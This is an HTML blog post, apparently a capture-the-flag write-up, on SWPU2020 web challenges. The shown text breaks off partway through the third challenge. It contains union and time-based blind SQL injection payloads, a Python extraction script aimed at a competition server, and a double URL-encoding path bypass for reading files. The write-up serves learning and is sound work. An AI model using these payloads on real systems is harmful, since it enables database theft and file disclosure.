@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>SWPU2020 | tyskillのBlog</title>
+
+    <link rel="stylesheet" href="/css/meme.min.7a71afbedd186ffaac4ba8190cf1910f0bcf15bc9124e380c6446e6257dfb04d.css"/>
+
+    
+    
+        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="tyskill" /><meta name="description" content="359度防护网站 大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="tyskillのBlog" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="tyskillのBlog" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://tyskill.github.io/posts/swpu2020/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2020-12-06T00:00:00+00:00",
+        "dateModified": "2020-12-08T00:00:00+00:00",
+        "url": "https://tyskill.github.io/posts/swpu2020/",
+        "headline": "SWPU2020",
+        "description": "359度防护网站 大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  2591 ,
+        "image": "https://tyskill.github.io/icons/icon.jpg",
+        "author": {
+            "@type": "Person",
+            "email": "tyskill@foxmail.com",
+            "image": "https://tyskill.github.io/icons/icon.jpg",
+            "url": "https://tyskill.github.io",
+            "name": "tyskill"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "tyskillのBlog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://tyskill.github.io/icons/icon.jpg"
+            },
+            "url": "https://tyskill.github.io/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://tyskill.github.io/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary" />
+
+
+    
+
+
+
+<meta property="og:title" content="SWPU2020" />
+<meta property="og:description" content="359度防护网站 大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长……" />
+<meta property="og:url" content="https://tyskill.github.io/posts/swpu2020/" />
+<meta property="og:site_name" content="tyskillのBlog" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://tyskill.github.io/icons/icon.jpg" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2020-12-06T00:00:00&#43;00:00" />
+    <meta property="article:modified_time" content="2020-12-08T00:00:00&#43;00:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">tyskillのBlog</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/"><span class="menu-item-name">首页</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/posts/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/categories/"><span class="menu-item-name">分类</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                        <li class="menu-item">
+                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
+                        </li>
+                    
+                
+            
+        
+            
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">SWPU2020</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2020-12-06T00:00:00&#43;00:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2020.12.6</time>
+    
+    
+        
+        <time datetime="2020-12-08T00:00:00&#43;00:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2020.12.8</time>
+    
+    
+    
+        
+        
+        
+            
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/categories/ctf/" class="category-link p-category">CTF</a></span>
+            
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2591</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;6&nbsp;分钟</span>
+    
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:359度防护网站" href="#359度防护网站">359度防护网站</a></li>
+    <li><a id="contents:sqlsqlsql" href="#sqlsqlsql">sqlsqlsql</a></li>
+    <li><a id="contents:原谅最光荣" href="#原谅最光荣">原谅最光荣</a></li>
+    <li><a id="contents:noobpy" href="#noobpy">noobpy</a></li>
+    <li><a id="contents:simple-injection" href="#simple-injection">simple injection</a></li>
+    <li><a id="contents:太极" href="#太极">太极</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+              <h2 id="359度防护网站"><a href="#359度防护网站" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:359度防护网站" class="headings">359度防护网站</a></h2>
+<p>大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长两年半的老lj。。。</p>
+<pre><code>/administrator.html
+/home.php
+/index.php.bak
+/log_in.php
+/robots.txt
+/test.php
+</code></pre><p><code>/robots.txt</code>提示了<code>/administrator.html</code>路由，访问<code>/administrator.html</code>，存在一个登录框，复现的话就不搞事情了(滑稽)</p>
+<p>下载index.php.bak得到一个请求体</p>
+<pre><code>GET /important_index_its_so_long_right.php?id=1 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><p>这地方才是真正的注入呀！</p>
+<p>一顿联合注入获得登陆账号和密码：<code>admin123 f1097380e513e86f2c1548cc1094bf4e(wllm@123)</code></p>
+<p>回到<code>/administrator.html</code>登录，登陆成功后F12获得注释信息</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--&lt;li&gt;&lt;a href=&#34;writeuser_00001_log.log&#34;&gt;日志记录&lt;/a&gt;&lt;/li&gt;--&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>访问获得日志记录，base64解码，然后访问<code>up_lo_ad_ad_min.php</code>，看名字是upload，应该是上传，寻找上传点，找不到。。。看了wp才发现原来还有另一个库<code>h1nt</code>，注入得到字段内容：</p>
+<pre><code>1:00001:last_index_come_on_swpu_ctf.php?id=4
+</code></pre><p>使用00001登录<code>up_lo_ad_ad_min.php</code>，出现上传点，绕不过，这里应该利用不了。。。不过此时hint字段的页面可以访问了且存在注入，直接<strong>load_file</strong>读取flag。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">0</span><span class="s1">&#39;union select 1,2,3,load_file(&#34;/flag&#34;)--+
+</span></code></pre></td></tr></table></div>
+</div>
+</div><h2 id="sqlsqlsql"><a href="#sqlsqlsql" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:sqlsqlsql" class="headings">sqlsqlsql</a></h2>
+<blockquote>
+<p>涉及到的所有字符均为小写
+hint1: 利用join多个大表造成延时
+hint2: 好好测测我都过滤了什么内容 根据过滤的内容想应对的方法</p>
+</blockquote>
+<p>先传一个id=1，然后F12发现SQL语句：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- select * from users where id = &#39;$id&#39;--&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>fuzz一下，ban了不少东西，官方wp上有的我就不说了，说点实际复现过程中遇到的问题：</p>
+<ul>
+<li>直接注会直接略过前1~4位，原因未知：使用reverse函数，然后将正注与反注的结果拼接(<code>正注：ag；反注：alllf.sresu</code>。这样很容易导致一个认知错误，就是会误认为表名是flllaag，这个我也不知道怎么解决，只能通过试错来判断了。。。)</li>
+<li>concat_group默认分隔符为逗号，但是逗号被ban了：使用通配符 . 代替逗号</li>
+</ul>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>  <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;_{}.&#34;</span>
+<span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://182.150.46.187:8801/ttttt/?id=&#39;</span>
+        <span class="c1"># 注表</span>
+        <span class="c1">## users,flllag</span>
+        <span class="c1"># sql_1 = &#34;select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())&#34;</span>
+        <span class="c1"># sql_1 = &#34;select(reverse(group_concat(table_name)))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())&#34;</span>
+        <span class="c1"># 无列名注入</span>
+        <span class="c1">## flag{blind_1nj3ct10n_1s_very_s1mpl3}</span>
+        <span class="c1">## 官方：select(group_concat(`2`))from(select*from(select(1))as`a`join(select(2))as`b`union(select*from(flllag)))as`a`</span>
+        <span class="n">sql_1</span> <span class="o">=</span> <span class="s2">&#34;select(group_concat(`2`))from(select*from((select(1))a)join((select(2))b)union(select*from(flllag)))c&#34;</span>
+        <span class="n">sql_2</span> <span class="o">=</span> <span class="s2">&#34;select({})regexp&#39;{}&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_1</span><span class="p">,</span> <span class="n">name</span><span class="o">+</span><span class="n">char</span><span class="p">)</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;case&#39;1&#39;when(({}))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_2</span><span class="p">)</span>
+        <span class="n">SQL</span> <span class="o">=</span> <span class="s2">&#34;1&#39;^(select({}))^&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="c1"># print(s)</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span> <span class="o">+</span> <span class="n">SQL</span><span class="p">)</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">:</span>
+            <span class="n">name</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]最终结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="原谅最光荣"><a href="#原谅最光荣" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:原谅最光荣" class="headings">原谅最光荣</a></h2>
+<blockquote>
+<p>hint: robots，题目不能出网</p>
+</blockquote>
+<p>robots.txt</p>
+<blockquote>
+<p>User-Agent: *<br>
+Disallow: /index.php?route=contact
+Disallow: /index.php?route=destinations
+Disallow: /index.php?route=index
+Disallow: /index.php?route=info
+Disallow: /index.php?route=pricing</p>
+</blockquote>
+<p>尝试路径拼接，访问<code>/./././pricing.action</code>，返回正常，说明可以拼接路径，但是测试无法跳转，这时可以尝试远程文件包含：<code>http://www.baidu.com.action</code>，回显处理路径源码：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">resolve_route</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$bad_url</span> <span class="k">as</span> <span class="nv">$ukey</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$ukey</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 404 Not Found&#39;</span><span class="p">);</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;p style=</span><span class="se">\&#34;</span><span class="s2">color: red</span><span class="se">\&#34;</span><span class="s2">&gt;Request URL &#39;</span><span class="si">$path</span><span class="s2">&#39; dose not exist!&lt;/p&gt;&#34;</span><span class="p">;</span>
+            <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;functions.php&#39;</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>可以看到这里对路径进行一次url解码，我们可以通过二次编码<code>%252f</code>绕过。既然知道怎么处理路径了，接下来就是读文件了，php伪协议直接读</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
